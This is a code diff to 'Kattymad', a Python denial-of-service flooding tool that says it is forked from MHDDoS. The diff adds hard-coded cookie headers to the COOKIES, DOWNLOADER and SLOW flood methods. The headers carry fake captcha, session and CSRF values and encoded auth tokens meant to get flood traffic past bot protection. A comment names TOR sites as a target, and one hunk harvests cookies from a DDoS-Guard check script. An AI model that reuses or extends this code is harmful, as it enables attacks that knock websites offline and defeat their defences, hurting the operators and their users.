@@ -4,8 +4,11 @@
 ##################    Kattymad v1.1 beta    ############################
 ##################    Forked from MHDDoS    ############################
 ########################################################################
-import colorama binasci  
+import colorama
+from colorama import Fore, init
+from sys import stdout
 import art
+from art import *
 import binascii
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
@@ -42,9 +45,6 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from hashlib import md5
-from colorama import Fore, init
-from sys import stdout
-from art import *
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
 logger = getLogger("kattymad")
@@ -198,6 +198,7 @@ class Tools:
                 "Sec-Fetch-Dest": "script",
                 "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site"
+
             }
             with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                 for key, value in ss.cookies.items():
@@ -643,11 +644,19 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
+#"Cookie: _ga=GA%s;"
     def COOKIES(self) -> None:
         payload: bytes = self.generate_payload(
             "Cookie: _ga=GA%s;"
-            " _gat=1;"
-            " _cfuvid=dc232334gwdsd23434512563742342342342475611928;" ## cfuvid is the best choise attacking TOR
+            " language=en;"
+            " captcha=C4PTCHA;"
+            " gate=G4T3Z;"
+            " SOLAUTH=eyJpdiI6InRLMjN1VzM2eFQyYjRFQVUwWFU5TGc9PSIsInZhbHVlIjoiblErazdia05VUEM2dzNvMndlOXU3RUluMm9FRGZ5ZFlydTc0Q3JDNkhPK1pOTjFnUUxmczlCOWNiMk1qSWVzXC9cL1ZVT2x6TUIzZzhVOXUwb0wzTjJIQT09IiwibWFjIjoiMjZmM2Y1YTUyZDFkZGNkYmZlNzFmMDJiZWM2YjVlYTI1Nzc4Zjk4ZGE1YzM2MGRhYjdhNGJjMjA1ZDYyOWI1MSJ9;"
+            #" XSRF-TOKEN=eyJpdiI6IjRYSVlKOXZoMUNlWStrQVBiT2wwUHc9PSIsInZhbHVlIjoiVSs4ZlNiWVQ3R2RkK25tSzBwTU5BVThrRDNJRVdCV0VjbnkwamZOTTFRMm5tWFwvRXRiQVJ6a2dPRU1TTSt1dlBIUTE5eDNxYnpVQ01DQTNyTWxKZlVnPT0iLCJtYWMiOiIxNzNkYjBjNTk3ZmZiNDEyZmY0MThhNmMzNDM2OGQzYzM0NjdlNTBjOGJjYjBiNzYzNTA1ZDYxNjRhYTM1NzI0In0;"
+            #" ASPXAUTH=eyJpdiI6Im9OMnJaYTRUM3dvSGxRREVlWWdEK1E9PSIsInZhbHVlIjoiUktDYUNtUzFUUHo5bGJoS3c2QWg1R3QyVFE2MGdvT2t0c25sUm5HTzA2eE5ycHkrNzFwaDhcL3Uxd3ZVeEJuQ1hQRWtncHlVWlVTMlJIR2FDQnFzQWZ3PT0iLCJtYWMiOiIwMGRkNmNhYmVhNjQ1MTFjZmU5M2M1MmQ1ZjAxYzM4OWRlMTU1YWUzMTI2YWEwYzJkOTlmNWNkYWU1NmNiY2YzIn;"
+            " sessionid=s3ss10n;"
+            " location=true;"
+            " csrf=GU4RDZ;" ## cfuvid is the best choise attacking TOR
             " %s=%s\r\n" %
             (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
              ProxyTools.Random.rand_str(32)))
@@ -811,7 +820,20 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
     def DOWNLOADER(self):
-        payload: Any = self.generate_payload()
+        payload: Any = self.generate_payload(
+            "Cookie: _ga=GA%s;"
+            " language=en;"
+            " captcha=C4PTCHA;"
+            " gate=G4T3Z;"
+            " SOLAUTH=eyJpdiI6InRLMjN1VzM2eFQyYjRFQVUwWFU5TGc9PSIsInZhbHVlIjoiblErazdia05VUEM2dzNvMndlOXU3RUluMm9FRGZ5ZFlydTc0Q3JDNkhPK1pOTjFnUUxmczlCOWNiMk1qSWVzXC9cL1ZVT2x6TUIzZzhVOXUwb0wzTjJIQT09IiwibWFjIjoiMjZmM2Y1YTUyZDFkZGNkYmZlNzFmMDJiZWM2YjVlYTI1Nzc4Zjk4ZGE1YzM2MGRhYjdhNGJjMjA1ZDYyOWI1MSJ9;"
+            #" XSRF-TOKEN=eyJpdiI6IjRYSVlKOXZoMUNlWStrQVBiT2wwUHc9PSIsInZhbHVlIjoiVSs4ZlNiWVQ3R2RkK25tSzBwTU5BVThrRDNJRVdCV0VjbnkwamZOTTFRMm5tWFwvRXRiQVJ6a2dPRU1TTSt1dlBIUTE5eDNxYnpVQ01DQTNyTWxKZlVnPT0iLCJtYWMiOiIxNzNkYjBjNTk3ZmZiNDEyZmY0MThhNmMzNDM2OGQzYzM0NjdlNTBjOGJjYjBiNzYzNTA1ZDYxNjRhYTM1NzI0In0;"
+            #" ASPXAUTH=eyJpdiI6Im9OMnJaYTRUM3dvSGxRREVlWWdEK1E9PSIsInZhbHVlIjoiUktDYUNtUzFUUHo5bGJoS3c2QWg1R3QyVFE2MGdvT2t0c25sUm5HTzA2eE5ycHkrNzFwaDhcL3Uxd3ZVeEJuQ1hQRWtncHlVWlVTMlJIR2FDQnFzQWZ3PT0iLCJtYWMiOiIwMGRkNmNhYmVhNjQ1MTFjZmU5M2M1MmQ1ZjAxYzM4OWRlMTU1YWUzMTI2YWEwYzJkOTlmNWNkYWU1NmNiY2YzIn;"
+            " sessionid=s3ss10n;"
+            " location=true;"
+            " csrf=GU4RDZ;" ## cfuvid is the best choise attacking TOR
+            " %s=%s\r\n" %
+            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
+             ProxyTools.Random.rand_str(32)))
 
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -963,7 +985,20 @@ class HttpFlood(Thread):
         if self._thread_id == 0:
             print(proxy, res.stdout.decode(), sep='\n')
     def SLOW(self):
-        payload: bytes = self.generate_payload()
+        payload: bytes = self.generate_payload(
+            "Cookie: _ga=GA%s;"
+            " language=en;"
+            " captcha=C4PTCHA;"
+            " gate=G4T3Z;"
+            " SOLAUTH=eyJpdiI6InRLMjN1VzM2eFQyYjRFQVUwWFU5TGc9PSIsInZhbHVlIjoiblErazdia05VUEM2dzNvMndlOXU3RUluMm9FRGZ5ZFlydTc0Q3JDNkhPK1pOTjFnUUxmczlCOWNiMk1qSWVzXC9cL1ZVT2x6TUIzZzhVOXUwb0wzTjJIQT09IiwibWFjIjoiMjZmM2Y1YTUyZDFkZGNkYmZlNzFmMDJiZWM2YjVlYTI1Nzc4Zjk4ZGE1YzM2MGRhYjdhNGJjMjA1ZDYyOWI1MSJ90%3D;"
+            " XSRF-TOKEN=eyJpdiI6IjRYSVlKOXZoMUNlWStrQVBiT2wwUHc9PSIsInZhbHVlIjoiVSs4ZlNiWVQ3R2RkK25tSzBwTU5BVThrRDNJRVdCV0VjbnkwamZOTTFRMm5tWFwvRXRiQVJ6a2dPRU1TTSt1dlBIUTE5eDNxYnpVQ01DQTNyTWxKZlVnPT0iLCJtYWMiOiIxNzNkYjBjNTk3ZmZiNDEyZmY0MThhNmMzNDM2OGQzYzM0NjdlNTBjOGJjYjBiNzYzNTA1ZDYxNjRhYTM1NzI0In0%3D;"
+            " ASPXAUTH=eyJpdiI6Im9OMnJaYTRUM3dvSGxRREVlWWdEK1E9PSIsInZhbHVlIjoiUktDYUNtUzFUUHo5bGJoS3c2QWg1R3QyVFE2MGdvT2t0c25sUm5HTzA2eE5ycHkrNzFwaDhcL3Uxd3ZVeEJuQ1hQRWtncHlVWlVTMlJIR2FDQnFzQWZ3PT0iLCJtYWMiOiIwMGRkNmNhYmVhNjQ1MTFjZmU5M2M1MmQ1ZjAxYzM4OWRlMTU1YWUzMTI2YWEwYzJkOTlmNWNkYWU1NmNiY2YzIn0%3D;"
+            " sessionid=s3ss10n;"
+            " location=true;"
+            " csrf=GU4RDZ;" ## cfuvid is the best choise attacking TOR
+            " %s=%s\r\n" %
+            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
+             ProxyTools.Random.rand_str(32)))
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
